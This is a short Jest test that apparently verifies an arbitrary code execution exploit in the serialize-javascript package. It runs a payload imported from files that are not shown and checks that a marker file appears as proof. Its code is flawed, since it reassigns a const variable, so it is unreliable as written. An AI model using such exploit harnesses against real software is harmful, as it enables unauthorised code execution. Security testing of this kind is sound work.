test("Arbitrary code execution in serialize-javascript", () => {
  const { exploitFunction } = require("./function.js");
  const { getPayload } = require('./payload.js');

  const fs = require("fs");
  const path = "./serialize-javascript";

  const file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  const payload = getPayload(process);
  exploitFunction(payload);

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {});
});